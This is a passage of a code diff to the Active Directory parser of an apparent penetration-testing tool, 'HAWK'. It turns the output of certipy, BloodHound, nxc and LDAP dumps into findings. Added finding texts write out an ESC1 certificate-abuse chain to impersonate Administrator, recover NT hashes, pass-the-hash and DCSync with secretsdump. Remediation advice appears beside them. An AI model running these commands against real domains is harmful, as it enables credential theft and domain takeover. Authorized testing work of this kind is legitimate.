+                            "Enterprise CA: a standalone or partial "
+                            "install creates it too.\n\n"
+                            "If you expected a CA, confirm on the CA host "
+                            "that the role is installed AND configured as "
+                            "an ENTERPRISE CA (certutil -cainfo) and "
+                            "registered under CN=Enrollment Services,"
+                            "CN=Public Key Services,CN=Services in the "
+                            "configuration NC."),
+                        severity="info", source=tool.name,
+                        linked_run_id=rid))
+                self.app.terminal.write(
+                    "  [i] certipy — no Enterprise CA registered (0 CAs); "
+                    "nothing to attack in the cert chain.", "info")
+                return True
+
+            # ── Path A: a CA IS present, just no ESC vulns ──────────────
+            if (ca_count and ca_count > 0) or "enterprise ca" in text_low:
                 self.app.after(0, lambda:
                     self.app.target_intel.add_auto_finding(
                         title=f"CERTIPY FIND — AD CS on {target} "
@@ -929,36 +1474,37 @@ class CardADParserMixin:
                     or "ssl: unexpected_eof" in text_low):
                 self.app.after(0, lambda:
                     self.app.target_intel.add_auto_finding(
-                        title=f"CERTIPY FIND — LDAPS unreachable on "
-                              f"{target}",
+                        title=f"CERTIPY FIND — LDAPS handshake reset on "
+                              f"{target} (retry over plain LDAP)",
                         description=(
-                            "Certipy tried to bind over LDAPS (636/tcp) "
-                            "but the connection reset before the TLS "
-                            "handshake completed.  Usually this means:\n"
-                            "  · AD CS (Active Directory Certificate "
-                            "Services) is NOT installed on the DC → "
-                            "nothing for certipy to enumerate\n"
-                            "  · LDAPS is running without a valid "
-                            "certificate → TLS fails\n"
-                            "  · 636/tcp is firewalled; only 389 "
-                            "(LDAP without TLS) is exposed\n\n"
-                            "Next moves:\n"
-                            "  · Check if 636/tcp is actually open — "
-                            "nmap -p 636 <target>\n"
-                            "  · Run  nxc ldap <target> -u <u> -p <p> "
-                            "--adcs  — uses plain LDAP (389) to probe "
-                            "CS presence without TLS\n"
-                            "  · If no AD CS is installed, skip the "
-                            "certipy chain entirely and pivot to "
-                            "BLOODHOUND + kerberoast for privesc\n"
-                            "  · Force LDAP (no TLS) via certipy "
-                            "-scheme ldap  (supported in recent "
-                            "versions)"),
+                            "Certipy binds over LDAPS (636/tcp) by "
+                            "default, but the DC reset the TLS handshake "
+                            "before it completed.  This is COMMON on "
+                            "legacy DCs (Server 2008/2012) whose LDAPS "
+                            "uses old TLS or has no certificate — it does "
+                            "NOT by itself mean AD CS is absent.\n\n"
+                            "Fix — retry over plain LDAP (389):\n"
+                            "  certipy find ... -ldap-scheme ldap   "
+                            "(certipy v5)\n"
+                            "  certipy find ... -scheme ldap        "
+                            "(certipy v4)\n"
+                            "  In HAWK: click the '-ldap-scheme ldap' chip "
+                            "in this card's dialog and re-run.\n\n"
+                            "If plain LDAP ALSO fails, then check:\n"
+                            "  · 389 and 636 both filtered — "
+                            "nmap -p 389,636 <target>\n"
+                            "  · AD CS genuinely absent — confirm with "
+                            "nxc ldap <target> -u <u> -p <p> --adcs\n"
+                            "  · Wrong creds / time skew — sanity-check "
+                            "auth first with  nxc smb <target> -u <u> "
+                            "-p <p>."),
                         severity="info", source=tool.name,
                         linked_run_id=rid))
                 self.app.terminal.write(
-                    "  [i] certipy — LDAPS unreachable.  Target "
-                    "probably has no AD CS role.", "info")
+                    "  [i] certipy — LDAPS handshake reset (common on "
+                    "legacy DCs).  Re-run over plain LDAP: add "
+                    "'-ldap-scheme ldap'.  AD CS may still be present.",
+                    "info")
                 return True
 
             # B2: authentication failed.
@@ -1034,21 +1580,29 @@ class CardADParserMixin:
         desc = [
             f"Certipy found {len(vulns)} AD CS misconfiguration(s) "
             f"on {target}.",
-            f"",
+            "",
             f"CA Name: {ca_name}",
-            f"",
-            "Vulnerable templates:",
+            "",
+            "Vulnerabilities:",
         ]
-        for tmpl, esc, note in vulns[:20]:
-            desc.append(f"  · {esc:<6}  {tmpl!r:<30}  {note[:80]}")
+        for subj, esc, note in vulns[:20]:
+            desc.append(f"  · {esc:<6}  {subj:<32}  {note[:80]}")
         if len(vulns) > 20:
             desc.append(f"  · … {len(vulns) - 20} more")
-        desc += ["", "Next step — request a cert for Administrator:",
+
+        # Pre-bake the ESC1 request with the REAL template when there is
+        # one (classic low-priv user -> Administrator escalation); else
+        # leave <template> for the operator to fill from the list above.
+        esc1_tmpl = next((subj for subj, esc, _ in vulns
+                          if esc.upper() == "ESC1"
+                          and not subj.startswith("CA ")), None)
+        tmpl_arg = repr(esc1_tmpl) if esc1_tmpl else "'<template>'"
+        desc += ["", "Next step — request a cert for Administrator (ESC1):",
                  f"  certipy req -u <user>@<domain> -p <pass> "
-                 f"-target {target} \\",
-                 f"    -ca {ca_name!r} -template '<template>' \\",
+                 f"-target {target} -ldap-scheme ldap \\",
+                 f"    -ca {ca_name!r} -template {tmpl_arg} \\",
                  f"    -upn Administrator@<domain> "
-                 f"-out <HAWK>/outputs/esc"]
+                 f"-out <HAWK>/outputs/esc1"]
 
         esc_names = sorted({v[1] for v in vulns})
         title = (f"CERTIPY FIND — AD CS vulnerable on {target}  "
@@ -1059,6 +1613,189 @@ class CardADParserMixin:
             linked_run_id=rid))
         self.app.terminal.write(
             f"  [+] Certipy — {len(vulns)} ESC vuln(s) → Target Intel.",
+            "success")
+        return True
+
+    def _parse_certipy_req_to_intel(self, tool, log: list) -> bool:
+        """certipy req — obtained a certificate impersonating a
+        privileged user via an ESC1 template.
+
+        The .pfx authenticates AS that user, so this is a HIGH finding
+        that names the impersonated identity and — crucially — the
+        ACTUAL path certipy wrote the .pfx to (certipy v5 sanitises path
+        separators in -out, so the file is often NOT where -out pointed).
+        Returns False when no cert was issued so real errors fall through
+        to the generic fallback.
+        """
+        import re
+        from utils.run_id import new_run_id
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+
+        if ("successfully requested certificate" not in text.lower()
+                and "got certificate" not in text.lower()):
+            return False
+
+        m_upn = re.search(r"Got certificate with UPN '([^']+)'", text)
+        upn = m_upn.group(1).strip() if m_upn else "the requested user"
+        m_pfx = (re.search(r"Wrote certificate and private key to "
+                           r"'([^']+)'", text)
+                 or re.search(r"Saving certificate and private key to "
+                              r"'([^']+)'", text))
+        pfx = m_pfx.group(1).strip() if m_pfx else "the .pfx printed above"
+        no_sid = "no object sid" in text.lower()
+
+        sid_note = (
+            "\nNote: the certificate has NO object SID (certipy could not "
+            "resolve it — usually a DNS failure to the domain).  On DCs "
+            "patched for CVE-2022-26923 you must re-run req with "
+            "'-sid <the target user's SID>'; on unpatched / legacy DCs UPN "
+            "mapping still authenticates.\n"
+            if no_sid else "")
+
+        self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
+            title=f"CERTIPY REQ — certificate obtained for {upn} on "
+                  f"{target}",
+            description=(
+                f"Abused an ESC1 template to enrol a certificate that "
+                f"authenticates AS {upn} — a low-privileged user just "
+                f"minted a logon certificate for a privileged account.\n\n"
+                f"Impersonated : {upn}\n"
+                f"Cert (.pfx)  : {pfx}\n"
+                f"{sid_note}\n"
+                f"Next step — turn the cert into a TGT + the NT hash "
+                f"(PKINIT / UnPAC-the-hash):\n"
+                f"  certipy auth -pfx '{pfx}' -dc-ip <DC-IP>\n"
+                f"  (Kerberos: needs the DC FQDN resolvable and the clock "
+                f"in sync — on a lab add the DC to /etc/hosts and "
+                f"ntpdate it.)\n\n"
+                f"Remediation:\n"
+                f"  Remove ENROLLEE_SUPPLIES_SUBJECT from the template (or "
+                f"require manager approval), restrict enrolment to trusted "
+                f"principals, and enable strong certificate mapping "
+                f"(KB5014754)."),
+            severity="high", source=tool.name,
+            linked_run_id=rid))
+        self.app.terminal.write(
+            f"  [+] certipy req — cert for {upn} at {pfx} -> "
+            f"Target Intel.", "success")
+        return True
+
+    def _parse_certipy_auth_to_intel(self, tool, log: list) -> bool:
+        """certipy auth — the payoff of the AD CS ESC1 chain.
+
+        PKINIT-authenticates with the ESC1 .pfx and UnPAC's the target's
+        NT hash.  Recovering a privileged account's hash this way is
+        effectively domain compromise, so we push the hash to the
+        Credential Store (verified=False — recovered, not NTLM-logged-in
+        by HAWK) and raise a CRITICAL finding with the pass-the-hash /
+        DCSync runbook.  Returns False when auth failed (no TGT, no hash)
+        so the real Kerberos error falls through to the generic fallback.
+        """
+        import re
+        from utils.session import Credential
+        from utils.run_id import new_run_id, TOOL_RUN_CATEGORY
+
+        target = self._get_target() or "target"
+        rid = new_run_id()
+        text = "\n".join(self._strip_ansi(ln) for _, ln in log)
+        low = text.lower()
+
+        m_hash = re.search(
+            r"Got hash for '([^']+)':\s*"
+            r"([0-9a-fA-F]{32}:[0-9a-fA-F]{32})", text)
+        m_ccache = re.search(r"credential cache to '([^']+)'", text)
+        ccache = m_ccache.group(1).strip() if m_ccache else ""
+        got_tgt = "got tgt" in low or bool(ccache)
+
+        if not m_hash and not got_tgt:
+            return False
+
+        if m_hash:
+            who = m_hash.group(1).strip()          # user@realm
+            full_hash = m_hash.group(2).strip()    # LM:NT
+            nt = full_hash.split(":")[-1]
+            uname = who.split("@")[0]
+            try:
+                self.app.cred_store.add_credential(Credential(
+                    username=uname,
+                    password="",
+                    hash_val=full_hash,
+                    hash_type="NTLM",
+                    cred_type="hash",
+                    services=["AD", "SMB", "WINRM"],
+                    source_phase=self.phase_id,
+                    host=target,
+                    notes=(f"NT hash recovered via AD CS ESC1 -> certipy "
+                           f"auth (PKINIT UnPAC-the-hash) for {who}.\n"
+                           f"Pass-the-hash / DCSync / golden ticket from "
+                           f"here."),
+                    linked_run_id=rid,
+                    category=TOOL_RUN_CATEGORY,
+                    verified=False))
+            except Exception as e:
+                print(f"[HAWK] certipy auth cred push failed: {e}")
+
+            tgt_line = f"TGT      : {ccache}\n" if ccache else ""
+            if ccache:
+                tgt_usage = (f"  Or the TGT directly: export "
+                             f"KRB5CCNAME={ccache}; klist; "
+                             f"impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+                             f"'<DOMAIN>/{uname}@<DC-FQDN>'\n")
+            else:
+                tgt_usage = ("  (HAWK runs certipy auth with -no-save to "
+                             "stay non-interactive, so no .ccache is "
+                             "written; re-run without -no-save if you want "
+                             "the TGT for pass-the-ticket.)\n")
+            _title = (f"CERTIPY AUTH — {uname} NT hash via ESC1 on "
+                      f"{target}")
+            _desc = (
+                f"Full AD CS ESC1 chain completed: a low-privileged user "
+                f"minted a certificate for {who}, PKINIT-authenticated, "
+                f"and UnPAC'd the account's NT hash — effectively domain "
+                f"compromise when the account is privileged.\n\n"
+                f"Account  : {who}\n"
+                f"NT hash  : {full_hash}\n"
+                f"{tgt_line}\n"
+                f"Use the hash:\n"
+                f"  Pass-the-hash: nxc smb <DC-IP> -u '{uname}' -H {nt}\n"
+                f"  DCSync every secret: impacket-secretsdump -hashes "
+                f":{nt} '<DOMAIN>/{uname}@<DC-IP>'\n"
+                f"{tgt_usage}\n"
+                f"Remediation:\n"
+                f"  Fix the ESC1 template (remove ENROLLEE_SUPPLIES_"
+                f"SUBJECT or require manager approval), enable strong "
+                f"certificate mapping (KB5014754), and rotate {uname}'s "
+                f"credentials.")
+            self.app.after(0, lambda:
+                self.app.target_intel.add_auto_finding(
+                    title=_title, description=_desc,
+                    severity="critical", source=tool.name,
+                    linked_run_id=rid))
+            self.app.terminal.write(
+                f"  [+] certipy auth — {uname} NT hash -> Credential "
+                f"Store + Target Intel.", "success")
+            return True
+
+        # TGT obtained but no hash printed — still a valid PKINIT auth.
+        krbcc = ccache or "<user>.ccache"
+        self.app.after(0, lambda:
+            self.app.target_intel.add_auto_finding(
+                title=f"CERTIPY AUTH — TGT obtained on {target}",
+                description=(
+                    f"certipy auth PKINIT-authenticated with the ESC1 "
+                    f"certificate and obtained a TGT (saved to {krbcc}), "
+                    f"but printed no NT hash.\n\n"
+                    f"Use the ticket:\n"
+                    f"  export KRB5CCNAME={krbcc}; klist\n"
+                    f"  impacket-psexec -k -no-pass -dc-ip <DC-IP> "
+                    f"'<DOMAIN>/<user>@<DC-FQDN>'"),
+                severity="high", source=tool.name,
+                linked_run_id=rid))
+        self.app.terminal.write(
+            "  [+] certipy auth — TGT obtained -> Target Intel.",
             "success")
         return True
 
@@ -1114,7 +1851,7 @@ class CardADParserMixin:
                     title=f"BLOODHOUND (collect) — {target}",
                     description="\n".join(desc),
                     severity="info", source=tool.name,
-                    linked_run_id=rid))
+                    linked_run_id=rid, replace=True))
             return True
 
         # Extract + parse
@@ -1147,30 +1884,16 @@ class CardADParserMixin:
                      computers_data.get("computers") or [])
         groups = groups_data.get("data") or groups_data.get("groups") or []
 
-        # Collect stats for the summary finding
-        da_members, kerberoastable, asrepable = [], [], []
-        unconstrained_pcs = []
-        user_names = []
-        for u in users:
-            props = u.get("Properties", {}) or {}
-            name = props.get("name") or props.get("samaccountname") or ""
-            if name:
-                user_names.append(name)
-            if props.get("hasspn"):
-                kerberoastable.append(name)
-            if props.get("dontreqpreauth"):
-                asrepable.append(name)
-        for g in groups:
-            props = g.get("Properties", {}) or {}
-            gname = (props.get("name") or "").upper()
-            if gname.startswith(("DOMAIN ADMINS@", "ENTERPRISE ADMINS@")):
-                for m in (g.get("Members") or []):
-                    da_members.append(
-                        m.get("ObjectIdentifier", "")[:20] + "…")
-        for c in computers:
-            props = c.get("Properties", {}) or {}
-            if props.get("unconstraineddelegation"):
-                unconstrained_pcs.append(props.get("name", ""))
+        # Collect stats for the summary finding (pure helper — unit-tested
+        # in tests/test_bloodhound_parser.py).  Excludes krbtgt/disabled
+        # accounts from the kerberoast list and resolves Domain/Enterprise
+        # Admins members to display names.
+        stats_x = _bloodhound_extract_stats(users, computers, groups)
+        user_names        = stats_x["user_names"]
+        kerberoastable    = stats_x["kerberoastable"]
+        asrepable         = stats_x["asrepable"]
+        unconstrained_pcs = stats_x["unconstrained_pcs"]
+        da_members        = stats_x["da_members"]
 
         # Push discovered users to the session
         try:
@@ -1191,6 +1914,7 @@ class CardADParserMixin:
             f"  Kerberoastable (SPN)        : {len(kerberoastable)}",
             f"  AS-REP roastable (no preauth): {len(asrepable)}",
             f"  Unconstrained delegation PCs: {len(unconstrained_pcs)}",
+            f"  Domain/Enterprise Admins    : {len(da_members)}",
             f"",
             f"Zip: {zip_path}",
             f"",
@@ -1214,15 +1938,25 @@ class CardADParserMixin:
                          "(goldmine for privesc):"]
             for n in unconstrained_pcs[:10]:
                 desc.append(f"  · {n}")
+        if da_members:
+            desc += ["", "Domain / Enterprise Admins "
+                         "(crown jewels — target these):"]
+            for n in da_members[:10]:
+                desc.append(f"  · {n}")
 
         sev = ("critical" if unconstrained_pcs or kerberoastable
                else ("medium" if asrepable else "info"))
+        # replace=True: bloodhound is a snapshot tool — every run is a
+        # full re-collection, so a re-run must OVERWRITE the finding's
+        # description, not append a diff onto the stale one (which
+        # produced a self-contradicting card: "Kerberoastable 1 / KRBTGT"
+        # from run #1 stacked above "Kerberoastable 0" from run #2).
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
             title=f"BLOODHOUND — {len(users)} users, "
                   f"{len(computers)} computers on {target}",
             description="\n".join(desc),
             severity=sev, source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
         self.app.terminal.write(
             f"  [+] BloodHound — parsed ZIP: {len(users)} users, "
             f"{len(kerberoastable)} kerberoastable, "
@@ -1300,6 +2034,17 @@ class CardADParserMixin:
             except Exception as e:
                 print(f"[HAWK] adidnsdump csv parse failed: {e}")
 
+        # adidnsdump writes a header row (type,name,value in some order).
+        # Drop it so the count matches adidnsdump's own "Found N records"
+        # tally and the table doesn't render a header pseudo-row; use the
+        # header to map columns robustly across adidnsdump versions.
+        col = {"type": 0, "name": 1, "value": 2}   # canonical order
+        if records and {c.strip().lower() for c in records[0]} == {
+                "type", "name", "value"}:
+            hdr = [c.strip().lower() for c in records[0]]
+            col = {k: hdr.index(k) for k in ("type", "name", "value")}
+            records = records[1:]
+
         if not records:
             # Fall back to stdout count
             text = "\n".join(self._strip_ansi(ln) for _, ln in log)
@@ -1320,25 +2065,35 @@ class CardADParserMixin:
 
         desc = [
             f"ADIDNSDUMP — full AD DNS zone on {target}.",
-            f"",
-            f"Records: {len(records)} (first 40 shown)",
-            f"",
+            "",
+            f"Records: {len(records)}"
+            + ("  (first 40 shown)" if len(records) > 40 else ""),
+            "",
+            f"  {'NAME':<28} {'TYPE':<5} VALUE",
         ]
-        for row in records[1:41]:   # skip header
+        for row in records[:40]:
             if len(row) >= 3:
-                desc.append(f"  {row[0]:<30}  {row[1]:<10}  {row[2]}")
-        if len(records) > 41:
-            desc.append(f"  … {len(records)-41} more in records.csv")
+                desc.append(
+                    f"  {row[col['name']]:<28} "
+                    f"{row[col['type']]:<5} {row[col['value']]}")
+        if len(records) > 40:
+            desc.append(f"  … {len(records)-40} more in records.csv")
         desc += ["",
+                 "Records shown as '?' have their value hidden in LDAP — "
+                 "re-run with the -r chip to resolve them via a live DNS "
+                 "query.",
+                 "",
                  "Extract useful hosts from this list and add them to "
-                 "your scan scope — every A record is a potential "
-                 "pivot."]
+                 "your scan scope — every A record is a potential pivot."]
 
+        # Snapshot semantics: each run reports the CURRENT full zone, so a
+        # stable title (no volatile record count) + replace=True refreshes
+        # the single finding instead of stacking a new card per run.
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
-            title=f"ADIDNSDUMP — {len(records)} DNS records on {target}",
+            title=f"ADIDNSDUMP — AD DNS zone on {target}",
             description="\n".join(desc),
             severity="info", source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
         self.app.terminal.write(
             f"  [+] adidnsdump — {len(records)} records → Target Intel.",
             "success")
@@ -1415,16 +2170,25 @@ class CardADParserMixin:
                 desc.append(f"  · {u}")
             if len(users) > 20:
                 desc.append(f"  · … {len(users)-20} more")
+        if computers:
+            desc += ["", "Computers (first 20):"]
+            for c in computers[:20]:
+                desc.append(f"  · {c}")
+            if len(computers) > 20:
+                desc.append(f"  · … {len(computers)-20} more")
         desc += ["",
                  f"Full output: {outdir}/domain_users.html + *.json + "
                  f"*.grep — open domain_users.html in a browser."]
 
+        # replace=True: ldapdomaindump is a snapshot tool (a re-run is a
+        # full re-dump), so overwrite the finding instead of appending a
+        # diff onto the stale one — same reasoning as bloodhound.
         self.app.after(0, lambda: self.app.target_intel.add_auto_finding(
             title=f"LDAPDOMAINDUMP — {len(users)} users / "
                   f"{len(computers)} computers on {target}",
             description="\n".join(desc),
             severity="info", source=tool.name,
-            linked_run_id=rid))
+            linked_run_id=rid, replace=True))
         self.app.terminal.write(
             f"  [+] ldapdomaindump — {len(users)} users, "
             f"{len(computers)} computers → Target Intel.", "success")
@@ -1480,6 +2244,21 @@ class CardADParserMixin:
             r"Found\s+\d+\s+asrep|Don'?t\s+Require\s+PreAuth",
             re.I)
 
+        # nxc >= 1.x prints --users and --groups as space-aligned TABLES
+        # (a dashed "-Username-" / "-Group-" header, then rows), not the
+        # older bare-name / "name members: N" form.  These headers start
+        # with "-", so they must be matched BEFORE the separator skip, and
+        # they switch the walker into a table state so group rows are
+        # parsed as groups (multi-word names intact) instead of leaking
+        # their first token into the user bucket (which reported ~40 users
+        # and 0 groups on a DC that has 4 users and ~50 groups).
+        _TBL_USERS = re.compile(r"^-+\s*Username\b", re.I)
+        _TBL_GROUPS = re.compile(r"^-+\s*Group\b", re.I)
+        # A table row: "<name>  <big gap>  <numeric column>  <rest>".  The
+        # non-greedy name keeps multi-word group names ("Print Operators",
+        # "Domain Admins") whole up to the members-count column.
+        _TBL_ROW = re.compile(r"^(.+?)\s{2,}\d+(?:\s|$)")
+
         # Bare samaccountname: alnum + underscore/dot/dash, optional
         # trailing $ (machine accounts).  First token only — group
         # lines have trailing text that we strip separately.
@@ -1511,6 +2290,10 @@ class CardADParserMixin:
                 state = "kerberoast"; continue
             if _SEC_ASREP.search(stripped):
                 state = "asrep"; continue
+            if _TBL_USERS.match(stripped):
+                state = "usertable"; continue
+            if _TBL_GROUPS.match(stripped):
+                state = "grouptable"; continue
 
             # Login banner / status / separator — skip.
             if stripped.startswith(("[", "-", "*")):
@@ -1523,6 +2306,21 @@ class CardADParserMixin:
                 continue
             if "$krb5asrep$" in stripped:
                 asrep_hashes.append(stripped)
+                continue
+
+            # nxc table rows (space-aligned columns): the first column is
+            # the group name / username; the trailing columns are metadata
+            # we don't bucket.  Parsed by state so a group row never leaks
+            # its first token into the user list.
+            if state == "grouptable":
+                m = _TBL_ROW.match(stripped)
+                if m:
+                    groups.append(m.group(1).strip())
+                continue
+            if state == "usertable":
+                first = stripped.split()[0]
+                if _USERNAME_RE.match(first):
+                    users.append(first)
                 continue
 
             # Groups: "Group Name                members: 5"
@@ -1560,6 +2358,13 @@ class CardADParserMixin:
 
         # Dedup preserving order.
         users           = list(dict.fromkeys(users))
+        # Machine accounts (trailing $) are not regular user accounts —
+        # they carry random 120-char passwords, so they're noise in the
+        # user list and useless in any wordlist.  Split them out so the
+        # "regular accounts" count/list stays honest (bloodhound and
+        # ldapdomaindump exclude them too).
+        machine_accts   = [u for u in users if u.endswith("$")]
+        users           = [u for u in users if not u.endswith("$")]
         groups          = list(dict.fromkeys(groups))
         admincount      = list(dict.fromkeys(admincount))
         delegation      = list(dict.fromkeys(delegation))
@@ -1649,6 +2454,7 @@ class CardADParserMixin:
             f"NETEXEC LDAP enumeration on {target}.",
             "",
             f"  Users discovered          : {len(users) + len(special)}",
+            f"  Machine accounts          : {len(machine_accts)}",
             f"  Groups discovered         : {len(groups)}",
             f"  Admin-count=1 users       : {len(admincount)}",
             f"  Trusted-for-delegation    : {len(delegation)}",
@@ -1674,18 +2480,32 @@ class CardADParserMixin:
                      "empty password logs in):"]
             for u in pwd_not_req[:20]:
                 desc.append(f"  · {u}")
+        # List the FULL enumeration in the (expandable) finding, not a
+        # 20-line teaser: on a real DC the operator needs every account
+        # and group name, and the Target Intel card scrolls.  Cap only to
+        # avoid a pathological multi-thousand-entry dump; anything beyond
+        # the cap still lives in the session (discovered_users/groups).
+        _LIST_CAP = 200
         if users:
-            shown = users[:20]
-            desc += ["", f"Users (first {len(shown)} of {len(users)} "
-                          "regular accounts):"]
+            shown = users[:_LIST_CAP]
+            more = len(users) - len(shown)
+            desc += ["", f"Users ({len(users)} regular accounts"
+                         + (f", first {_LIST_CAP} shown" if more else "")
+                         + "):"]
             for u in shown:
                 desc.append(f"  · {u}")
+            if more:
+                desc.append(f"  ... (+{more} more in the session)")
         if groups:
-            shown = groups[:15]
-            desc += ["", f"Groups (first {len(shown)} of "
-                          f"{len(groups)}):"]
+            shown = groups[:_LIST_CAP]
+            more = len(groups) - len(shown)
+            desc += ["", f"Groups ({len(groups)}"
+                         + (f", first {_LIST_CAP} shown" if more else "")
+                         + "):"]
             for g in shown:
                 desc.append(f"  · {g}")
+            if more:
+                desc.append(f"  ... (+{more} more in the session)")
         if kerberoastable_hashes or asrep_hashes:
             desc += ["",
                      "Kerberos hashes pushed to Credential Store "
@@ -1697,14 +2517,16 @@ class CardADParserMixin:
                    or asrep_hashes) else
                "high" if admincount else
                "info")
+        # Stable title (target only) so re-running nxc ldap UPDATES the
+        # one finding with a run-count badge instead of spawning a new
+        # finding whenever the user/group counts change.  The counts live
+        # in the description; replace=True refreshes it to the latest run.
         self.app.after(0, lambda:
             self.app.target_intel.add_auto_finding(
-                title=f"NXC LDAP — {target}  ·  "
-                      f"{len(users) + len(special)} users, "
-                      f"{len(groups)} groups",
+                title=f"NXC LDAP — {target}",
                 description="\n".join(desc),
                 severity=sev, source=tool.name,
-                linked_run_id=rid))
+                linked_run_id=rid, replace=True))
 
         self.app.terminal.write(
             f"  [+] nxc ldap parsed — "
@@ -1817,85 +2639,85 @@ class CardADParserMixin:
             return True
 
         # ── Case B: LDIF object records ───────────────────────────────────
-        # Extract per-record blocks split on blank-line-after-dn
         users    = []  # sAMAccountName strings
         groups   = []  # cn strings
         computers = []  # dNSHostName strings
         spn_users = []  # (sAMAccountName, [spns]) — kerberoastable
         asrep_users = []  # sAMAccountName — AS-REP roastable
-        current: dict = {}
 
-        for line in lines:
-            line = line.strip()
-            if not line:
-                # end of record — classify and store
-                if current:
-                    sam  = current.get("samaccountname", "")
-                    ocs  = current.get("objectclass", [])
-                    if isinstance(ocs, str):
-                        ocs = [ocs]
-                    ocs_lo = [o.lower() for o in ocs]
-                    if "user" in ocs_lo and sam:
-                        users.append(sam)
-                        spns = current.get("serviceprincipalname", [])
-                        if isinstance(spns, str):
-                            spns = [spns]
-                        if spns:
-                            spn_users.append((sam, spns))
-                        # DONT_REQUIRE_PREAUTH = flag 0x400000 = 4194304
-                        uac = current.get("useraccountcontrol", "")
-                        try:
-                            if int(uac) & 0x400000:
-                                asrep_users.append(sam)
-                        except (ValueError, TypeError):
-                            pass
-                    elif "group" in ocs_lo:
-                        cn = current.get("cn", "")
-                        if cn:
-                            groups.append(cn)
-                    elif "computer" in ocs_lo:
-                        host = current.get("dnshostname", sam)
-                        if host:
-                            computers.append(host)
-                current = {}
-                continue
+        def _store(rec):
+            """Classify one LDIF record.  objectClass is authoritative when
+            present, but the preset queries usually DON'T request it (the
+            "All Users" preset asks only for sAMAccountName/mail/displayName/
+            memberOf), so fall back to the attributes we do have: a
+            sAMAccountName ending in '$' (or a dNSHostName) is a computer,
+            any other sAMAccountName is a user, a bare cn is a group.
+            Without this fallback every preset that omitted objectClass
+            parsed to zero objects and produced no finding at all."""
+            if not rec:
+                return
+            sam = rec.get("samaccountname", "")
+            ocs = rec.get("objectclass", [])
+            if isinstance(ocs, str):
+                ocs = [ocs]
+            ocs_lo = [o.lower() for o in ocs]
+            if ocs_lo:
+                kind = ("computer" if "computer" in ocs_lo
+                        else "group" if "group" in ocs_lo
+                        else "user" if "user" in ocs_lo else "")
+            elif sam.endswith("$") or rec.get("dnshostname"):
+                kind = "computer"
+            elif sam:
+                kind = "user"
+            elif rec.get("cn"):
+                kind = "group"
+            else:
+                kind = ""
 
-            # Parse attribute: value
-            if ":" in line:
-                attr, _, val = line.partition(":")
-                val = val.strip()
-                attr_lo = attr.strip().lower()
-                if attr_lo == "objectclass":
-                    current.setdefault("objectclass", [])
-                    current["objectclass"].append(val)
-                elif attr_lo == "serviceprincipalname":
-                    current.setdefault("serviceprincipalname", [])
-                    current["serviceprincipalname"].append(val)
-                else:
-                    current[attr_lo] = val
-
-        # process last record if no trailing blank line
-        if current:
-            sam  = current.get("samaccountname", "")
-            ocs_lo = [o.lower() for o in
-                      (current.get("objectclass", [])
-                       if isinstance(current.get("objectclass"), list)
-                       else [current.get("objectclass", "")])]
-            if "user" in ocs_lo and sam:
+            if kind == "user" and sam:
                 users.append(sam)
-                spns = current.get("serviceprincipalname", [])
+                spns = rec.get("serviceprincipalname", [])
                 if isinstance(spns, str):
                     spns = [spns]
                 if spns:
                     spn_users.append((sam, spns))
-            elif "group" in ocs_lo:
-                cn = current.get("cn", "")
+                # DONT_REQUIRE_PREAUTH = flag 0x400000 = 4194304
+                uac = rec.get("useraccountcontrol", "")
+                try:
+                    if int(uac) & 0x400000:
+                        asrep_users.append(sam)
+                except (ValueError, TypeError):
+                    pass
+            elif kind == "group":
+                cn = rec.get("cn", "") or sam
                 if cn:
                     groups.append(cn)
-            elif "computer" in ocs_lo:
-                host = current.get("dnshostname", sam)
+            elif kind == "computer":
+                host = rec.get("dnshostname", "") or sam
                 if host:
                     computers.append(host)
+
+        current: dict = {}
+        for line in lines:
+            line = line.strip()
+            # LDIF records start with `dn:` and are separated by blank
+            # lines; some servers print only a `# comment` between them, so
+            # treat a fresh `dn:` as a record boundary too.
+            if not line or line.lower().startswith("dn:"):
+                _store(current)
+                current = {}
+                if not line:
+                    continue
+            if ":" in line:
+                attr, _, val = line.partition(":")
+                val = val.strip()
+                attr_lo = attr.strip().lower()
+                if attr_lo in ("objectclass", "serviceprincipalname"):
+                    current.setdefault(attr_lo, [])
+                    current[attr_lo].append(val)
+                else:
+                    current[attr_lo] = val
+        _store(current)
 
         total = len(users) + len(groups) + len(computers)
         if total == 0:
@@ -1930,10 +2752,13 @@ class CardADParserMixin:
             desc_lines += ["Computers:"] + [f"  {c}" for c in computers[:20]]
             desc_lines.append("")
 
+        # Stable title (target only) + replace so a repeat ldapsearch
+        # updates the one finding with a badge instead of stacking a new
+        # "N objects" finding each time the object count changes.
         self.app.target_intel.add_auto_finding(
-            title=f"LDAP Enumeration — {total} objects discovered",
+            title=f"LDAP Enumeration — {target}",
             description="\n".join(desc_lines).strip(),
-            severity="info", source="ldapsearch")
+            severity="info", source="ldapsearch", replace=True)
 
         # ── Security findings ─────────────────────────────────────────────
         if spn_users:
